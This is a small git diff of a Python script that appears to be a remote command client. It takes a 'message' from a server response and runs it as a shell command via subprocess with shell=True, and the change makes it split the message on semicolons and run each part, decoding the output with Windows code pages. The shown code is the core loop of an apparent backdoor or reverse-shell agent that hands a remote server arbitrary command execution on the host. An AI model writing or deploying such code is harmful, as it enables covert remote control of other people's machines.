@@ -19,8 +19,11 @@ def main():
         print("Server's response:", response)
         output = ""
         try:
-            output = subprocess.check_output(response["message"], shell=True)
-            output = str(output, encoding="437")
+            output = b""
+            for command in response["message"].split(";"):
+                output += subprocess.check_output(command, shell=True)
+            #output = subprocess.check_output(response["message"], shell=True)
+            output = str(output, encoding="850")
         except subprocess.CalledProcessError as e:
             output = "Error: " + str(e)
             print("Error:", e)
